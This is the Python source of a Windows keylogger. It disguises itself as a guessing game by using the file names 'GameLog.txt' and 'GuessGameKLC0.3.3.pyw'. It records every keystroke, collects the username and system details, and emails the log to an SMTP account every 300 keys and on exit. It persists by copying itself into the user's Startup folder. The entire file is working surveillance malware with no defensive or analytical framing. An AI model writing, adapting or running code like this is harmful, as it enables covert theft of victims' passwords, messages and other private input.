import pynput, smtplib, os, re, win32api, datetime, platform, atexit, shutil, sys, pip
from pynput.keyboard import Key, Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv

load_dotenv


pip.main(["install", "--user", "pynput"])
pip.main(["install", "--user", "datetime"])

#Variables
count = 0
mailCount = 0
logNumber = 0
keys = []

path = os.path.abspath("C:/GameLog.txt")
fileExists = os.path.isfile(path)

#Create a file if doesn't exist
if not fileExists:
    open(f"{path}", "w").close()
#A function for sending mail
def sendMail():

    #Formating the date
    dateNow = datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S")

    #Email Variables
    email_user = os.getenv("EMAIL")
    email_send = os.getenv("EMAIL")
    email_password = os.getenv("PASSWORD")
    subject = f"{logNumber}. {os.getlogin()} {dateNow} Log"
    
    #Formating the email message
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject

    f = open(path, "r")

    body = f"Machine: {platform.machine()}\nOs: {platform.system()} {platform.version()}\nUserName: {os.getlogin()}\nDevice Name: {platform.node()}\nProcessor: {platform.processor}\n\n{f.read()}"
    msg.attach(MIMEText(body,'plain'))
    
    text = msg.as_string()
    server = smtplib.SMTP_SSL('smtp.seznam.cz', 465)
    server.login(email_user, email_password)

    #Sending the email
    server.sendmail(email_user, email_send, text)
    server.quit()
    f.close()
    print("Email sended sucessfuly")

sendMail()

try:
    scriptPath = os.path.realpath(__file__)
except NameError:
    scriptPath = os.path.realpath(sys.argv[0])

shutil.copy(scriptPath, f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GuessGameKLC0.3.3.pyw")
#This function will save the keys
def onPress(key):
    global keys, count, mailCount, logNumber

    keys.append(key)
    count += 1
    mailCount +=1
    print(f"{key} pressed")

    #Evry 1 key it will update the file
    if count >= 1:
        count = 0
        writeFile(keys)
        keys = []
    
    #Every 300 keys, it will send a email
    if mailCount >= 300:
        mailCount = 0
        sendMail()
        logNumber += 1

#This function will write in to the file
def writeFile(keys):
    with open(f"{path}", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("96") > 0:
                f.write("0")
            if k.find("97") > 0:
                f.write("1")
            if k.find("98") > 0:
                f.write("2")
            if k.find("99") > 0:
                f.write("3")
            if k.find("100") > 0:
                f.write("4")
            if k.find("101") > 0:
                f.write("5")
            if k.find("102") > 0:
                f.write("6")
            if k.find("103") > 0:
                f.write("7")
            if k.find("104") > 0:
                f.write("8")
            if k.find("105") > 0:
                f.write("9")
            if k.find("space") > 0 or k.find("enter") > 0:
                f.write("\n")
            if k.find("backspace") > 0:
                f.write("<<")
            elif k.find("Key") == -1:
                f.write(k)

#When program exits
def exitHandler():
    sendMail()

atexit.register(exitHandler)

#Listens to key events
with Listener(on_press=onPress, on_release=None) as listener:
    listener.join()